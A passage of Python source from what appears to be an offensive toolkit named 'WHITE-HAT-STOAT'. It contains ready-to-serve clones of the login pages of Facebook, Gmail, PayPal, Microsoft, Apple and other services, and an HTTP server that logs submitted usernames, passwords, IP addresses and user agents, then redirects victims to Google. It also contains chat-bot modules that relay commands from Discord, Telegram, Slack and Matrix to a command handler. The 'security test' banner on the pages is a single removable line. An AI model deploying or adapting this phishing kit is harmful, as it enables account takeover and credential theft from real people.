    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)
    
    def _facebook_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Facebook</title>
<style>
body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:20px;width:400px;box-shadow:0 2px 4px rgba(0,0,0,.1)}
.logo{color:#1877f2;font-size:40px;text-align:center;margin-bottom:20px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box}
button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;border-radius:4px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">facebook</div>
<form method="POST">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _instagram_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Instagram</title>
<style>
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border:1px solid #dbdbdb;padding:40px;width:350px}
.logo{font-size:50px;text-align:center;margin-bottom:30px}
input{width:100%;padding:9px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px;box-sizing:border-box}
button{width:100%;padding:7px;background:#0095f6;color:white;border:none;border-radius:4px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;border-radius:4px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">📸 Instagram</div>
<form method="POST">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _twitter_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>X / Twitter</title>
<style>
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea}
.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}
.logo{font-size:40px;text-align:center}
h2{text-align:center;font-weight:400}
input{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;border-radius:4px;color:#e7e9ea;box-sizing:border-box}
button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:9999px;cursor:pointer}
.warning{margin-top:20px;padding:12px;background:#1a1a1a;border:1px solid #2f3336;text-align:center;border-radius:4px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">𝕏</div>
<h2>Sign in to X</h2>
<form method="POST">
<input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _gmail_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Gmail</title>
<style>
body{background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:28px;padding:48px;width:450px}
.logo{color:#1a73e8;font-size:24px;text-align:center}
input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer}
.warning{margin-top:30px;padding:12px;background:#e8f0fe;text-align:center;border-radius:4px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Gmail</div>
<form method="POST">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _linkedin_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>LinkedIn</title>
<style>
body{background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:40px;width:400px}
.logo{color:#0a66c2;font-size:32px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:28px;cursor:pointer}
.warning{margin-top:24px;padding:12px;background:#fff3cd;text-align:center;border-radius:4px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">LinkedIn</div>
<form method="POST">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _github_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>GitHub</title>
<style>
body{background:#0d1117;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#f0f6fc}
.login-box{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:32px;width:340px}
.logo{font-size:40px;text-align:center}
h2{text-align:center;font-weight:400}
input{width:100%;padding:8px;margin:8px 0;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#f0f6fc;box-sizing:border-box}
button{width:100%;padding:10px;background:#238636;color:white;border:none;border-radius:6px;cursor:pointer}
.warning{margin-top:16px;padding:10px;background:#1c2333;border:1px solid #30363d;text-align:center;border-radius:6px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">GitHub</div>
<h2>Sign in to GitHub</h2>
<form method="POST">
<input type="text" name="username" placeholder="Username or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _microsoft_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Microsoft</title>
<style>
body{background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:4px;padding:44px;width:440px}
.logo{color:#ff5722;font-size:28px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:2px;box-sizing:border-box}
button{width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:2px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:2px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Microsoft</div>
<form method="POST">
<input type="text" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _apple_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Apple ID</title>
<style>
body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:12px;padding:40px;width:420px}
.logo{font-size:36px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #d6d6d6;border-radius:8px;box-sizing:border-box}
button{width:100%;padding:12px;background:#007aff;color:white;border:none;border-radius:8px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:8px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"> Apple ID</div>
<form method="POST">
<input type="text" name="email" placeholder="Apple ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _amazon_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Amazon</title>
<style>
body{background:#e3e6e6;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:32px;width:378px}
.logo{color:#f90;font-size:36px;text-align:center}
input{width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:10px;background:#f0c14b;color:#111;border:1px solid #a88734;border-radius:4px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fdf5e6;text-align:center;border-radius:4px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Amazon</div>
<form method="POST">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _paypal_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>PayPal</title>
<style>
body{background:#f7f7f7;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:40px;width:400px}
.logo{color:#003087;font-size:28px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#0070ba;color:white;border:none;border-radius:20px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">PayPal</div>
<form method="POST">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _custom_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Secure Portal</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#000 0%,#333 100%);display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
.logo{text-align:center;margin-bottom:30px}
.logo h1{color:#000;font-size:28px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
button{width:100%;padding:14px;background:#000;color:white;border:none;border-radius:8px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#f8d7da;border-radius:8px;color:#721c24;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>Secure Portal</h1></div>
<form method="POST">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""

class PhishingRequestHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            if self.server_instance and self.server_instance.html_content:
                self.wfile.write(self.server_instance.html_content.encode())
            
            if self.server_instance and self.server_instance.db and self.server_instance.link_id:
                self.server_instance.db.conn.execute(
                    "UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?",
                    (self.server_instance.link_id,)
                )
                self.server_instance.db.conn.commit()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        form_data = urllib.parse.parse_qs(post_data)
        
        username = form_data.get('email', form_data.get('username', ['']))[0]
        password = form_data.get('password', [''])[0]
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        if self.server_instance and self.server_instance.db and username and password:
            self.server_instance.db.save_captured_credential(
                self.server_instance.link_id, username, password, client_ip, user_agent
            )
            print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
            print(f"  IP: {client_ip}")
            print(f"  Username: {username}")
            print(f"  Password: {password}")
        
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com')
        self.end_headers()

class PhishingServer:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.running = False
        self.link_id = None
        self.html_content = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        try:
            self.link_id = link_id
            self.html_content = html_content
            
            handler = PhishingRequestHandler
            handler.server_instance = self
            
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            self.running = True
            return True
        except:
            return False
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
    
    def get_url(self) -> str:
        return f"http://{self._get_local_ip()}:8080"
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# =====================
# BOT INTEGRATION MODULES
# =====================

# Discord Bot
class DiscordBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "discord_config.json")):
                with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'token': '', 'prefix': '!'}
    
    def save_config(self, token: str, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'token': token, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not DISCORD_AVAILABLE:
            return False
        if not self.config.get('token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.SUCCESS}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                result = self.handler.execute(cmd, 'discord', str(message.author.id))
                output = result.get('output', '')[:1900]
                embed = discord.Embed(title="🦡 WHITE-HAT-STOAT Response", 
                                     description=f"```{output}```",
                                     color=0x000000)
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        return True
    
    def start(self):
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            asyncio.run(self.bot.start(self.config['token']))
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# Telegram Bot
class TelegramBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "telegram_config.json")):
                with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'chat_id': '', 'prefix': '/'}
    
    def save_config(self, bot_token: str, chat_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'chat_id': chat_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not TELETHON_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                self.client = TelegramClient('whs_session', 1, 'dummy')
                await self.client.start(bot_token=self.config['bot_token'])
                print(f"{Colors.SUCCESS}✅ Telegram bot connected{Colors.RESET}")
                
                @self.client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith(self.config.get('prefix', '/')):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        self.db.log_message('telegram', str(event.sender_id), cmd, output)
                        await event.reply(f"```{output}```\n_Time: {result.get('execution_time', 0):.2f}s_")
                
                await self.client.run_until_disconnected()
            
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# Slack Bot
class SlackBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "slack_config.json")):
                with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
    
    def save_config(self, bot_token: str, channel_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'channel_id': channel_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not SLACK_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        self.client = WebClient(token=self.config['bot_token'])
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        channel = self.config.get('channel_id', 'general')
        last_ts = {}
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
                            ts = msg.get('ts')
                            if last_ts.get(channel) != ts:
                                last_ts[channel] = ts
                                cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
                                result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                                output = result.get('output', '')[:2000]
                                self.db.log_message('slack', msg.get('user', 'unknown'), cmd, output)
                                self.client.chat_postMessage(
                                    channel=channel,
                                    text=f"```{output}```\n*Time: {result.get('execution_time', 0):.2f}s*"
                                )
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)

# WhatsApp Bot
class WhatsAppBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.driver = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "whatsapp_config.json")):
                with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not SELENIUM_AVAILABLE:
            return False
        if not WEBDRIVER_MANAGER_AVAILABLE:
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            options = Options()
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--user-data-dir=' + os.path.join(CONFIG_DIR, "whatsapp_session"))
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.driver.get('https://web.whatsapp.com')
            print(f"{Colors.YELLOW}📱 WhatsApp Web opened. Scan QR code to connect.{Colors.RESET}")
            time.sleep(15)
            self.running = True
            while self.running:
                try:
                    time.sleep(5)
                except:
                    pass
        except Exception as e:
            logger.error(f"WhatsApp bot error: {e}")

# Signal Bot
class SignalBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "signal_config.json")):
                with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'group_id': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str, group_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'group_id': group_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return SIGNAL_AVAILABLE
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        while self.running:
            try:
                time.sleep(10)
            except:
                pass
    
    def send_message(self, recipient: str, message: str) -> bool:
        try:
            cmd = ['signal-cli', '-u', self.config.get('phone_number', ''), 'send', '-m', message, recipient]
            subprocess.run(cmd, capture_output=True, timeout=10)
            return True
        except:
            return False

# Google Chat Bot
class GoogleChatBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "google_chat_config.json")):
                with open(os.path.join(CONFIG_DIR, "google_chat_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'webhook_url': '', 'space_id': '', 'prefix': '/'}
    
    def save_config(self, webhook_url: str, space_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'webhook_url': webhook_url, 'space_id': space_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "google_chat_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def start(self):
        if self.config.get('enabled') and self.config.get('webhook_url'):
            self.running = True
            print(f"{Colors.SUCCESS}✅ Google Chat webhook configured{Colors.RESET}")
    
    def send_message(self, message: str) -> bool:
        try:
            data = {'text': message}
            response = requests.post(self.config['webhook_url'], json=data, timeout=10)
            return response.status_code == 200
        except:
            return False

# Matrix Bot
class MatrixBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "matrix_config.json")):
                with open(os.path.join(CONFIG_DIR, "matrix_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'homeserver': 'https://matrix.org', 'username': '', 'password': '', 'room_id': '', 'prefix': '!'}
    
    def save_config(self, homeserver: str, username: str, password: str, room_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'homeserver': homeserver, 'username': username, 'password': password, 'room_id': room_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "matrix_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not MATRIX_AVAILABLE:
            return False
        if not self.config.get('username') or not self.config.get('password'):
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            from matrix_client.client import MatrixClient
            self.client = MatrixClient(self.config['homeserver'])
            self.client.login(username=self.config['username'], password=self.config['password'])
            print(f"{Colors.SUCCESS}✅ Matrix bot connected as {self.config['username']}{Colors.RESET}")
            self.running = True
            
            room_id = self.config.get('room_id')
            if room_id:
                room = self.client.get_room(room_id)
                if room:
                    room.add_listener(self._handle_message)
                    self.client.start_listener_thread()
            
            while self.running:
                time.sleep(1)
        except Exception as e:
            logger.error(f"Matrix bot error: {e}")
    
    def _handle_message(self, room, event):
        if event.get('type') == 'm.room.message':
            content = event.get('content', {})
            if content.get('msgtype') == 'm.text':
                text = content.get('body', '')
                if text.startswith(self.config.get('prefix', '!')):
                    cmd = text[len(self.config.get('prefix', '!')):].strip()
                    result = self.handler.execute(cmd, 'matrix', event.get('sender'))
                    self.db.log_message('matrix', event.get('sender'), cmd, result.get('output', '')[:500])
                    room.send_text(f"```{result.get('output', '')[:2000]}```\n_Time: {result.get('execution_time', 0):.2f}s_")

# iMessage Bot
class iMessageBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "imessage_config.json")):
                with open(os.path.join(CONFIG_DIR, "imessage_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_numbers': [], 'prefix': '!'}
    
    def save_config(self, phone_numbers: List[str] = None, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_numbers': phone_numbers or [], 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "imessage_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return IMESSAGE_AVAILABLE
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        while self.running:
            try:
                time.sleep(10)
            except:
                pass
    
    def send_message(self, phone: str, message: str) -> bool:
        try:
            script = f'tell application "Messages" to send "{message}" to buddy "{phone}"'
            subprocess.run(['osascript', '-e', script], timeout=10)
            return True
        except:
            return False

# =====================
# WEB DASHBOARD (Black & White Theme)
# =====================
class WebDashboard:
    def __init__(self, command_handler, db: DatabaseManager, config: ConfigManager):
        self.handler = command_handler
        self.db = db
        self.config = config
        self.app = None
        self.socketio = None
        self.running = False
    
    def create_app(self):
        if not WEB_AVAILABLE:
            return None
        
        app = Flask(__name__)
        app.config['SECRET_KEY'] = self.config.get('web.secret_key', secrets.token_hex(32))
        CORS(app)
        
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        # Black & White Theme HTML Template
        TEMPLATE = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>🦡 WHITE-HAT-STOAT - Security Dashboard</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: #000;
                    color: #fff;
                    min-height: 100vh;
                }
                .header {
                    background: #111;
                    padding: 20px;
                    text-align: center;
                    border-bottom: 2px solid #fff;
                }
                .header h1 { font-size: 2.5em; color: #fff; }
                .header p { opacity: 0.7; color: #aaa; }
                .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin-bottom: 30px;
                }
                .stat-card {
                    background: #111;
                    border: 1px solid #333;
                    border-radius: 10px;
                    padding: 20px;
                    text-align: center;
                    transition: border-color 0.3s;
                }
                .stat-card:hover { border-color: #fff; }
                .stat-card h3 { font-size: 2em; color: #fff; }
                .stat-card p { margin-top: 10px; opacity: 0.7; color: #aaa; }
                .section {
                    background: #111;
                    border: 1px solid #333;
                    border-radius: 10px;
                    padding: 20px;
                    margin-bottom: 20px;
                }
                .section h2 { margin-bottom: 15px; color: #fff; border-bottom: 1px solid #333; padding-bottom: 10px; }
                table { width: 100%; border-collapse: collapse; }
                th, td { padding: 12px; text-align: left; border-bottom: 1px solid #222; }
                th { background: #222; color: #fff; }
                .command-input {
                    width: 100%;
                    padding: 15px;
                    background: #000;
                    border: 1px solid #444;
                    border-radius: 8px;
                    color: #fff;
                    font-size: 16px;
                    margin-bottom: 10px;
                }
                .command-input:focus { outline: none; border-color: #fff; }
                button {
                    background: #fff;
                    color: #000;
                    border: none;
                    padding: 12px 30px;
                    border-radius: 8px;
                    cursor: pointer;
                    font-size: 16px;
                    font-weight: bold;
                }
                button:hover { opacity: 0.8; }
                .output {
                    background: #000;
                    border: 1px solid #333;
                    border-radius: 8px;
                    padding: 15px;
                    font-family: monospace;
                    margin-top: 15px;
                    white-space: pre-wrap;
                    max-height: 400px;
                    overflow-y: auto;
                    color: #aaa;
                }
                .status-badge {
                    display: inline-block;
                    padding: 4px 8px;
                    border-radius: 4px;
                    font-size: 12px;
                }
                .status-online { background: #00ff00; color: #000; }
                .status-offline { background: #ff0000; color: #fff; }
                .severity-critical { background: #ff0000; color: #fff; }
                .severity-high { background: #ff6600; color: #fff; }
                .severity-medium { background: #ffcc00; color: #000; }
                .severity-low { background: #00ff00; color: #000; }
                ::-webkit-scrollbar { width: 8px; }
                ::-webkit-scrollbar-track { background: #111; }
                ::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; }
                ::-webkit-scrollbar-thumb:hover { background: #666; }
                .tab-bar {
                    display: flex;
                    gap: 10px;
                    margin-bottom: 20px;
                    flex-wrap: wrap;
                }
                .tab {
                    padding: 10px 20px;
                    background: #111;
                    border: 1px solid #333;
                    border-radius: 8px;
                    cursor: pointer;
                    transition: all 0.3s;
                }
                .tab:hover, .tab.active {
                    border-color: #fff;
                    background: #222;
                }
                .tab-content { display: none; }
                .tab-content.active { display: block; }
                .badge { background: #222; padding: 2px 10px; border-radius: 12px; font-size: 12px; color: #aaa; }
            </style>
            <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
            <script>
                var socket = io();
                
                socket.on('command_result', function(data) {
                    var outputDiv = document.getElementById('command-output');
                    outputDiv.innerHTML = '<strong>Command:</strong> ' + data.command + '<br>' +
                                          '<strong>Output:</strong><br>' + data.output + '<br>' +
                                          '<strong>Time:</strong> ' + data.execution_time + 's';
                });
                
                function executeCommand() {
